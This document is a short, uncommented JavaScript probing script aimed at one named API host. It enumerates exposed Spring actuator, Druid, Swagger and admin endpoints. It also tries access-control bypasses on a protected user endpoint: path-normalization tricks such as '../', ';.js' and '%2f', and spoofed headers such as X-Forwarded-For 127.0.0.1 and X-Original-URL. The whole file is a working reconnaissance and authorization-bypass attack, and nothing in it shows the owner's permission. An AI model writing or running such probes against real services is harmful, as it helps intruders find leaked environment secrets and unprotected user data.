
const UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36';
const B='https://api.dimnx.com';
async function g(path, hdrs={}){
  const u=B+path;
  try{
    const r=await fetch(u,{headers:{'User-Agent':UA,'Accept':'*/*',...hdrs},redirect:'manual'});
    const t=await r.text();
    return r.status+' | '+(t.length>150?t.replace(/\s+/g,' ').slice(0,150)+'…':t.replace(/\s+/g,' '));
  }catch(e){return 'ERR '+e.message;}
}
const probes=[
 '/api/actuator','/api/actuator/health','/api/actuator/env','/api/actuator/mappings',
 '/api/druid/index.html','/api/druid/login.html','/api/swagger-ui/index.html','/api/v3/api-docs','/api/doc.html','/api/v2/api-docs',
 '/api/../api/users/me','/api//users/me','/api/./users/me','/api/users/me;.js','/api/users/me%2f','/API/users/me','/api/users/me/',
 '/api/system/user/list','/api/system/dict/data/list','/api/error','/api/admin','/api/api-docs'
];
for(const p of probes) console.log(p.padEnd(28), await g(p));
console.log('\n--- XFF / header spoof on protected ---');
for(const h of [{'X-Forwarded-For':'127.0.0.1'},{'X-Real-IP':'127.0.0.1'},{'X-Forwarded-Host':'localhost'},{'X-Original-URL':'/actuator/health'}]){
  console.log(JSON.stringify(h).padEnd(42), await g('/api/users/me', h));
}
